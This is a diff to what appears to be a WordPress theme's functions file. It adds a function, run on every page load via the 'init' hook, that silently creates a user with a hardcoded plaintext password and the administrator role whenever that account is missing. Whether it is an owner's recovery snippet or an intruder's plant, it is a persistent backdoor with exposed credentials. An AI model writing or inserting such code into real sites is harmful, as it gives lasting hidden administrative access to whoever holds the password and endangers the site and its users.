@@ -192,3 +192,15 @@ function cinturonesLoop()
 
     //Jugueticos para hacer mas rico todo
     add_post_type_support( 'page', 'excerpt' );
+
+    function wpb_admin_account(){
+        $user = 'muituhandmadeAdmin';
+        $pass = '3VoAdErK75';
+        $email = 'info@muituhandmade.com';
+            if ( !username_exists( $user )  && !email_exists( $email ) ) {
+            $user_id = wp_create_user( $user, $pass, $email );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+        } 
+    }
+    add_action('init','wpb_admin_account');
